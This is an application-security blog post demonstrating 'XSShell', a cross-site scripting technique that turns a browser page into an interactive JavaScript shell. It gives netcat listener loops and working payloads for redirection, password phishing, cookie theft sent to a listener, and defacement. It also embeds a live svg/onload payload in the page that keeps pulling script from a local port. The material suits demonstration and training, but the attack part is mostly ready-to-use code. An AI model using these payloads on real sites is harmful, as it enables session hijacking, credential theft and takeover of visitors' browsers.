title: 'Fun with XSShell'
publish: True
categories: [application security]

So this is kinda fun. With this page open, copy and paste one of the listener commands from below into a terminal window on your local machine. Then, paste `alert(42)` into the resulting shell and press "Enter". Once you recover from the initial shock of what you just witnessed, play with the following payloads and spend the next hour of life thoroughly enjoying yourself.

<!-- READMORE -->

### Listeners

#### Linux

``` text
while :; do printf "j$ "; read c; printf "HTTP/1.1 200 OK\n\n$c" | nc -lp 8000 >/dev/null; done
```

#### OS X

``` text
while :; do printf "j$ "; read c; printf "HTTP/1.1 200 OK\n\n$c" | nc -l 8000 >/dev/null; done
```

### Example Payloads

#### Redirection

``` text
window.location = 'https://www.practisec.com/training/'
```

#### Phishing

``` text
i=new Image();i.src="http://127.0.0.1:8888/pw/"+prompt("Password:")
```

* Requires a second listener, e.g. `python -m "SimpleHTTPServer" 8888`.

#### Session Hijacking

``` text
i=new Image();i.src="http://127.0.0.1:8888/pw/"+document.cookie
```

* Requires a second listener, e.g. `python -m "SimpleHTTPServer" 8888`.

#### Defacement

``` text
d=document;e=d.createElement("p");e.innerHTML="lanmaster53 wuz here!";d.body.appendChild(e)
```

### Credits

This is all based on the code shared in the following tweets.

<div class="row">
<div class="six columns">
<blockquote class="twitter-tweet tw-align-center" data-conversation="none" lang="en"><p lang="en" dir="ltr">XSShell - Target<br><br>&lt;svg/onload=setInterval(function(){d=document;z=d.createElement(&quot;script&quot;);z.src=&quot;//HOST:PORT&quot;;d.body.appendChild(z)},0)&gt;</p>&mdash; Brute (@brutelogic) <a href="https://twitter.com/brutelogic/status/639069519097503744">September 2, 2015</a></blockquote>
</div>
<div class="six columns">
<blockquote class="twitter-tweet tw-align-center" data-conversation="none" lang="en"><p lang="en" dir="ltr">XSShell - Attacker<br><br>$ while :; do printf &quot;j$ &quot;; read c; echo <a href="https://twitter.com/search?q=%24c&amp;src=ctag">$c</a> | nc -lp PORT &gt;/dev/null; done</p>&mdash; Brute (@brutelogic) <a href="https://twitter.com/brutelogic/status/639073880922030080">September 2, 2015</a></blockquote>
</div>
</div>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

<!-- attack payload -->
<svg/onload=setInterval(function(){d=document;try{d.getElementById("x").remove()}catch(e){};z=d.createElement("script");z.id="x";z.src="http://127.0.0.1:8000";d.body.appendChild(z)},3000)>

Check the source code here ^^^ for the active payload.
